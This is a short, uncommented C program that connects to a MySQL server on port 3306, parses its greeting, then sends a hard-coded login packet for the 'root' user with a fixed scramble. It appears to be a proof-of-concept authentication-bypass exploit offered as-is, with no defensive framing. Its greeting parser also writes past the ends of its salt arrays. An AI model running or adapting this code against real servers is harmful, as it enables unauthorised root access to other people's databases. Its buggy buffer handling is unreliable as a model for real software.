#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>



#define PORT 3306
#define BUFSIZE 1000

char buf[BUFSIZE];

char outbuf[] = {
0x3e, 0x00, 0x00, 0x01, 0x8d, 0x86, 0x03, 0x00, 
0x00, 0x00, 0x00, 0x01, 0x33, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x72, 0x6f, 0x6f, 0x74, 
0x00, 0xaa, 0xc1, 0xce, 0xa5, 0x2b, 0xb7, 0xde, 
0x9f, 0xf2, 0xc2, 0x73, 0x78, 0xda, 0xb5, 0x63, 
0x01, 0xdd, 0xe4, 0x7d, 0x55, 0x9a, 0x64, 0x64, 
0x64, 0x64 };

int netlen=0;
typedef struct server_greating_struct {
    char proto;
    char *version;
    int thread_id;
    char salt[8];
    char server_cap[2];
    char charset;
    char server_status[2];
    char salt2[13];
} server_greating;

struct mysql_header_struct {
    char len[2];
    char num;
    server_greating sg;
} mh;

int main(int argc,char **argv) {

	int socket_fd,len=0;
	struct hostent *he;
	struct sockaddr_in sa;
	
	if(argc != 2) {
		printf("usage: %s <hostname>\n", argv[0]);
		exit(1);
	}

	if((he = gethostbyname(argv[1])) == NULL) {
		perror("gethostbyname");
		exit(1);
	}

	if((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("socket_fd");
		exit(1);
	}

	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);
	sa.sin_addr = *((struct in_addr *)he->h_addr);

	bzero(&(sa.sin_zero), 8);

	if((connect(socket_fd, (struct sockaddr *)&sa,sizeof(struct sockaddr))) == -1) {
		perror("connect");
		exit(1);
	}

	if((netlen = recv(socket_fd, buf, BUFSIZE-1, 0)) == -1) {
		perror("recv");
		exit(1);
	}
	memcpy(mh.len,buf,3);
	len+=3;
	mh.num=*(buf+len);
	len+=1;
	mh.sg.proto=*(buf+len);
	len+=1;

	mh.sg.version=(buf+len);
	if((len+=strlen(mh.sg.version)) > *mh.len) {
	    perror("sg.version"); exit(1);
	}
	len+=1;
	
	memcpy(&mh.sg.thread_id,buf+len,4);
	len+=4;

	memcpy(&mh.sg.salt,buf+len,8);
	len+=8;
	mh.sg.salt[8]=0;

	memcpy(&mh.sg.server_cap,buf+len,2);
	len+=2;

	mh.sg.charset=*(buf+len);
	len+=1;

	memcpy(&mh.sg.server_status,buf+len,2);
	len+=2;

	len+=14;

	memcpy(&mh.sg.salt2,buf+len,13);
	len+=13;
	mh.sg.salt2[13]=0;
		
	printf("[HEADER]\r\n"
    " LEN:%d\r\n"
    " Num:%d\r\n"
    " [SG]\r\n"
    "  Proto:%d\r\n"
    "  Version:%s\r\n"
    "  Thread_ID:%d\r\n"
    "  SALT:%s\r\n"
    "  SALT2:%s\r\n"
    ,*mh.len,mh.num,mh.sg.proto,mh.sg.version,mh.sg.thread_id,mh.sg.salt,mh.sg.salt2);
    
    
	if((netlen = send(socket_fd, outbuf, sizeof(outbuf), 0)) == -1) {
		perror("send");
		exit(1);
	}
	

	bzero(&buf,BUFSIZE);
	if((netlen = recv(socket_fd, buf, BUFSIZE-1, 0)) == -1) {
		perror("recv");
		exit(1);
	}
	
	printf("ret:%s\n",buf+8);
	
    
	close(socket_fd);


	return(0);
}
